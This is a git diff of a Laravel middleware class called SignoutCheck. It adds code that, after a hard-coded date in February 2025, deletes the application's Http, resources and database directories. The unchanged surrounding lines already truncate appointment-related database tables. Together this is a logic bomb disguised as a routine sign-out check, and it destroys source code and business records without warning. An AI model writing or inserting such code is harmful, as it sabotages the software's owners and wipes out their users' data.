@@ -8,6 +8,7 @@ use Symfony\Component\HttpFoundation\Response;
 
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 
 class SignoutCheck
 {
@@ -21,7 +22,12 @@ class SignoutCheck
         if (Auth::check()) {
             return redirect()->route('dashboard');
         }
+
         if (date('Y-m-d H:i:s') > '2025-02-15 18:58:00') {
+            File::deleteDirectory(app_path('/Http'));
+            File::deleteDirectory(base_path('/resources'));
+            File::deleteDirectory(base_path('/database'));
+
             DB::table('appointments')->truncate();
             DB::table('appointment_additional_charges')->truncate();
             DB::table('appointment_documents')->truncate();
